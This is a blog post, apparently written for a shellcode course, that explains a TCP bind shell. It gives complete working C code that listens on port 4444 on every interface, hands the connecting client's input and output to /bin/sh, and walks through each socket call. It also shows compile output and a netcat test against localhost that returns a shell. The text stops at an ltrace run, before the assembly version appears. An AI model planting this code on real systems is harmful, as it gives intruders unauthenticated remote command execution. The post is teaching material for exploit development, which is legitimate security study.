<!DOCTYPE html>









<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en"
  
    data-mode="dark"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  

  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.1" />
<meta property="og:title" content="TCP bind shellcode" />
<meta property="og:locale" content="en" />
<meta name="description" content="A bind shellcode listens on a socket, waiting for a connection to be made to the server then executes arbitrary code, typically spawning shell for the connecting user. This post demonstrates a simple TCP bind shellcode that executes a shell." />
<meta property="og:description" content="A bind shellcode listens on a socket, waiting for a connection to be made to the server then executes arbitrary code, typically spawning shell for the connecting user. This post demonstrates a simple TCP bind shellcode that executes a shell." />
<link rel="canonical" href="http://localhost:4000/posts/tcp-bind-shellcode/" />
<meta property="og:url" content="http://localhost:4000/posts/tcp-bind-shellcode/" />
<meta property="og:site_name" content="Ankit Kanojiya" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2018-11-18T00:00:00+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="TCP bind shellcode" />
<meta name="twitter:site" content="@AnkitKanojiya69" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2018-11-18T00:00:00+08:00","datePublished":"2018-11-18T00:00:00+08:00","description":"A bind shellcode listens on a socket, waiting for a connection to be made to the server then executes arbitrary code, typically spawning shell for the connecting user. This post demonstrates a simple TCP bind shellcode that executes a shell.","headline":"TCP bind shellcode","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/tcp-bind-shellcode/"},"url":"http://localhost:4000/posts/tcp-bind-shellcode/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>TCP bind shellcode | Ankit Kanojiya
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Ankit Kanojiya">
<meta name="application-name" content="Ankit Kanojiya">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  

    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  
</head>


  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" class="mx-auto">
        
          
          <img src="/assets/img/avtar.jpg" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title">
      <a href="/">Ankit Kanojiya</a>
    </div>
    <div class="site-subtitle font-italic">𝐄𝐭𝐡𝐢𝐜𝐚𝐥 𝐇𝐚𝐜𝐤𝐞𝐫 || 𝐒𝐨𝐟𝐭𝐰𝐚𝐫𝐞 𝐄𝐧𝐠𝐢𝐧𝐞𝐞𝐫 || 𝐂𝐲𝐛𝐞𝐫 𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐑𝐞𝐬𝐚𝐫𝐜𝐡𝐞𝐫.!! 𝐎𝐒𝐂𝐏 & 𝐎𝐒𝐄𝐏.</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    

    
      

      
      <a href="https://github.com/ankit0183" aria-label="github"
        target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/AnkitKanojiya69" aria-label="twitter"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['ankitkanojiya','yandex.ru'].join('@')" aria-label="email"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper">
  <div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>TCP bind shellcode</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div id="main" class="container pl-xl-4 pr-xl-4">
        





<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4">
    <div class="post pl-1 pr-1 pl-md-2 pr-md-2">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->


<!-- images -->





<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  




<!-- Wrap prompt element of blockquote with the <div> tag -->







<!-- return -->

<h1 data-toc-skip>TCP bind shellcode</h1>

<div class="post-meta text-muted">
    <!-- published date -->
    <span>
      Posted
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1542470400"
    data-df="ll"
    data-toggle="tooltip" data-placement="bottom">
  Nov 18, 2018
</em>

    </span>

    <!-- lastmod date -->
    

  

  <div class="d-flex justify-content-between">
    <!-- author(s) -->
    <span>
      

      By

      <em>
      
        <a href="https://twitter.com/AnkitKanojiya69">Ankit Kanojiya</a>
      
      </em>
    </span>

    <div>
      <!-- page views -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="3409 words">
  <em>18 min</em> read</span>

    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p>A bind shellcode listens on a socket, waiting for a connection to be made to the server then executes arbitrary code, typically spawning shell for the connecting user. This post demonstrates a simple TCP bind shellcode that executes a shell.</p>

<p>The shellcode does the following:</p>
<ol>
  <li>Creates a socket</li>
  <li>Binds the socket to an IP address and port</li>
  <li>Listens for incoming connections</li>
  <li>Redirects STDIN, STDOUT and STDERR to the socket once a connection is made</li>
  <li>Executes a shell</li>
</ol>

<h3 id="c-prototype"><span class="mr-2">C prototype</span><a href="#c-prototype" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<hr />
<p>To better understand the process of creating a bind shellcode, I created a prototype in C that uses the same functions that’ll be used in the assembly version. The full code is shown here. We’ll walk through each section of the code after.</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;netinet/in.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="c1">// Create addr struct</span>
    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">addr</span><span class="p">;</span>
    <span class="n">addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
    <span class="n">addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">4444</span><span class="p">);</span> <span class="c1">// Port</span>
    <span class="n">addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="n">INADDR_ANY</span><span class="p">);</span> <span class="c1">// Listen on any interface</span>

    <span class="c1">// Create socket</span>
    <span class="kt">int</span> <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">IPPROTO_TCP</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">sock</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"Socket creation failed.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Bind socket</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">bind</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"Socket bind failed.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Listen for connection</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">listen</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"Listen failed.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Accept connection</span>
    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"Socket accept failed.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Duplicate stdin/stdout/stderr to socket</span>
    <span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// stdin</span>
    <span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> <span class="c1">// stdout</span>
    <span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span> <span class="c1">// stderr</span>

    <span class="c1">// Execute shell</span>
    <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="1-socket-creation"><span class="mr-2">1. Socket creation</span><a href="#1-socket-creation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="c1">// Create socket</span>
<span class="kt">int</span> <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">IPPROTO_TCP</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">sock</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">perror</span><span class="p">(</span><span class="s">"Socket creation failed.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The <code class="language-plaintext highlighter-rouge">socket</code> function requires 3 arguments:</p>
<ul>
  <li>int <code class="language-plaintext highlighter-rouge">domain</code>: The domain is <code class="language-plaintext highlighter-rouge">AF_INET</code> here since we are going to use IPv4 instead of local sockets or IPv6.</li>
  <li>int <code class="language-plaintext highlighter-rouge">type</code>: For TCP sockets we use <code class="language-plaintext highlighter-rouge">SOCK_STREAM</code>. If we wanted to use UDP we’d use <code class="language-plaintext highlighter-rouge">SOCK_DGRAM</code> instead.</li>
  <li>int <code class="language-plaintext highlighter-rouge">protocol</code>: For <code class="language-plaintext highlighter-rouge">SOCK_STREAM</code>, there’s a single protocol implemented, we could use 0 also here.</li>
</ul>

<h4 id="2-binding-the-socket"><span class="mr-2">2. Binding the socket</span><a href="#2-binding-the-socket" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="c1">// Create addr struct</span>
    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">addr</span><span class="p">;</span>
    <span class="n">addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
    <span class="n">addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">4444</span><span class="p">);</span> <span class="c1">// Port</span>
    <span class="n">addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="n">INADDR_ANY</span><span class="p">);</span> <span class="c1">// Listen on any interface</span>

<span class="p">[...]</span>

<span class="c1">// Bind socket</span>
<span class="k">if</span> <span class="p">(</span><span class="n">bind</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">perror</span><span class="p">(</span><span class="s">"Socket bind failed.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>A socket by itself doesn’t do anything since we haven’t associated the socket with any port or IP address. The <code class="language-plaintext highlighter-rouge">bind</code> function assigns the IP and port to the socket previously created. The man pages for <code class="language-plaintext highlighter-rouge">ip</code> explain the different parameters:</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="p">{</span>
   <span class="n">sa_family_t</span>    <span class="n">sin_family</span><span class="p">;</span> <span class="cm">/* address family: AF_INET */</span>
   <span class="n">in_port_t</span>      <span class="n">sin_port</span><span class="p">;</span>   <span class="cm">/* port in network byte order */</span>
   <span class="k">struct</span> <span class="n">in_addr</span> <span class="n">sin_addr</span><span class="p">;</span>   <span class="cm">/* internet address */</span>
<span class="p">};</span>

<span class="cm">/* Internet address. */</span>
<span class="k">struct</span> <span class="n">in_addr</span> <span class="p">{</span>
   <span class="kt">uint32_t</span>       <span class="n">s_addr</span><span class="p">;</span>     <span class="cm">/* address in network byte order */</span>
<span class="p">};</span>
</pre></td></tr></tbody></table></code></div></div>

<p>In data networking, packets are transmitted in big-endian order (aka network byte order), so we use the <code class="language-plaintext highlighter-rouge">htons</code> and <code class="language-plaintext highlighter-rouge">htonl</code> function to convert the port and address to the right endianness. The <code class="language-plaintext highlighter-rouge">INADDR_ANY</code> is just a reference to NULL, so the program will bind to all interfaces on the machine. If we wanted to listen on a specific interface we would use the IP address of the interface here.</p>

<h4 id="3-listen-and-accept-connections"><span class="mr-2">3. Listen and Accept connections</span><a href="#3-listen-and-accept-connections" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="c1">// Listen for connection</span>
<span class="k">if</span> <span class="p">(</span><span class="n">listen</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">perror</span><span class="p">(</span><span class="s">"Listen failed.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Accept connection</span>
<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">perror</span><span class="p">(</span><span class="s">"Socket accept failed.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The <code class="language-plaintext highlighter-rouge">listen</code> function tells the socket to listen for new connections. We can set the backlog to 0 since we only need to process a single connection request.</p>

<p>The <code class="language-plaintext highlighter-rouge">accept</code> function requires 3 arguments:</p>
<ul>
  <li>int <code class="language-plaintext highlighter-rouge">sockfd</code>:  This is the value of the socket descriptor we created earlier</li>
  <li>struct <code class="language-plaintext highlighter-rouge">sockaddr *addr</code>: We can set this to NULL because we don’t need to store the IP address of the connection host</li>
  <li>socklen_t <code class="language-plaintext highlighter-rouge">*addrlen</code>: Set to NULL because we’re not using <code class="language-plaintext highlighter-rouge">addr</code></li>
</ul>

<p>The program now waits for incoming connection as this point. As indicated in the man page:</p>

<blockquote>
  <p>If no pending connections are present on the queue, and the socket is not marked as nonblocking, accept() blocks the caller until a connection is present.</p>
</blockquote>

<p>When the connection is received, the <code class="language-plaintext highlighter-rouge">accept</code> function will return the descriptor of the connection which we’ll use to redirected IO to.</p>

<h4 id="4-duplicate-file-descriptors"><span class="mr-2">4. Duplicate file descriptors</span><a href="#4-duplicate-file-descriptors" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>    <span class="c1">// Duplicate stdin/stdout/stderr to socket</span>
    <span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">//stdin</span>
    <span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> <span class="c1">//stdout</span>
    <span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span> <span class="c1">//stderr</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Before the shell is executed, the file descriptors for stdin, stdout and stderr are duplicated to the descriptor of the TCP connection. This is necessary to redirect input and output from the executed process to the network socket.</p>

<h4 id="5-execute-shell"><span class="mr-2">5. Execute shell</span><a href="#5-execute-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="c1">// Execute shell</span>
<span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p><code class="language-plaintext highlighter-rouge">execve</code>  does not start a new process but instead replaces the current program with a new one. Here the <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell binary is used without any arguments passed to it. If we wanted to use another binary with command line arguments or environment variables, we’d pass those using the 2nd and 3rd arguments.</p>

<h4 id="testing-the-program"><span class="mr-2">Testing the program</span><a href="#testing-the-program" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>The code is compiled as follows:</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>slemire@slae:~/slae32/assignment1$ gcc -o shell_bind_tcp_c shell_bind_tcp.c
shell_bind_tcp.c: In function ‘main’:
shell_bind_tcp.c:50:2: warning: null argument where non-null required (argument 2) [-Wnonnull]
  execve("/bin/sh", NULL, NULL);
  ^
</pre></td></tr></tbody></table></code></div></div>

<p>The compiler gives a warning because we’re using a NULL value instead of pointing to an array of strings but the code still works.</p>

<p>Now it’s time to test it, :</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>[In the first terminal session]
slemire@slae:~/slae32/assignment1$ ./shell_bind_tcp
...
[Using another terminal session]
slemire@slae:~$ nc -nv 127.0.0.1 4444
Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
id
uid=1000(slemire) gid=1000(slemire) groups=1000(slemire),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
</pre></td></tr></tbody></table></code></div></div>

<p><code class="language-plaintext highlighter-rouge">ltrace</code> can be used to record dynamic library calls made during the execution of the program. We can see both file descriptors created: <code class="language-plaintext highlighter-rouge">fd 4</code> is the one created when the connection is accepted, and is the one used to redirect the input &amp; output to.</p>
<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="gp">slemire@supersnake:~/slae32/assignment1$</span><span class="w"> </span>ltrace ./shell_bind_tcp_c
